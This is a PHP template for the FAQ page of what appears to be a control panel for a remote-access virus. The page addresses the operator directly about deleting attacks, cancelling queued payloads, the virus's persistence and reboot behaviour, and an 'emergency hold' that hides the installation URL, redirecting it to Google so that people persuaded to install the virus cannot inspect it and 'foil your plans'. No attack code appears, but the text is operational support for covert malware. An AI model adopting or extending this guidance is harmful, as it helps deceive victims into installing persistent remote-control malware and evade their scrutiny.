<?php

use Kelvinho\Virus\Singleton\HtmlTemplate;

?>
<html lang="en_US">
<head>
    <title>Frequently asked questions</title>
    <?php HtmlTemplate::header(); ?>
</head>
<body>
<?php if ($authenticator->authenticated()) HtmlTemplate::topNavigation(); ?>
<h2>Frequently asked questions</h2>
<h3>What happens when you delete an attack?</h3>
<p>It's gone, never to be seen again. We make a commitment to discard every information you really want to delete.</p>
<h3>What happens when you delete a virus?</h3>
<p>It's gone on the server, and you will never be able to control it or view any information collected again. However,
    the virus itself will still be there, will still report back to the server and can potentially recover control. If
    you want it to really be gone, use the easy.SelfDestruct package. Note that for some virus configurations, you can't
    make it to self destruct, because it will be devastating to the host computer.</p>
<h3>What is an emergency hold?</h3>
<p>Normally, you can install the virus using the commands provided. What it does is it copies installation instructions
    from the URL and executes that. However, if you are trying to convince others to willingly install the virus on
    their computer, they might go to the URL and inspect what's there after they have run it (or before they run it, in
    which case you're out of luck). They may figure out where the virus is located and may get curious and reverse
    engineer it and foil your plans. So, this is a way to hide that URL, and redirect it to google if you choose to hold
    it.</p>
<h3>What happens if the target computer is not online?</h3>
<p>Then you can't execute any payloads. It's that simple. If an attack is occurring and the host computer shuts down,
    then when the computer reboots, the virus itself will start up and redo the attack and will report back to the
    server, no additional action is needed from you.</p>
<h3>Can I really cancel an attack that I deployed?</h3>
<p>The virus will check for payloads it needs to execute every <?php echo VIRUS_PING_INTERVAL; ?> seconds. So, if you
    cancel <?php echo VIRUS_PING_INTERVAL * 0.9; ?> seconds after you deployed, there is a 90% chance that it has
    already begin executing it. This means that you shouldn't rely on this feature much, and it's there to cancel
    attacks when the target computer is shutdown only.</p>
</body>
<?php HtmlTemplate::scripts(); ?>
</html>
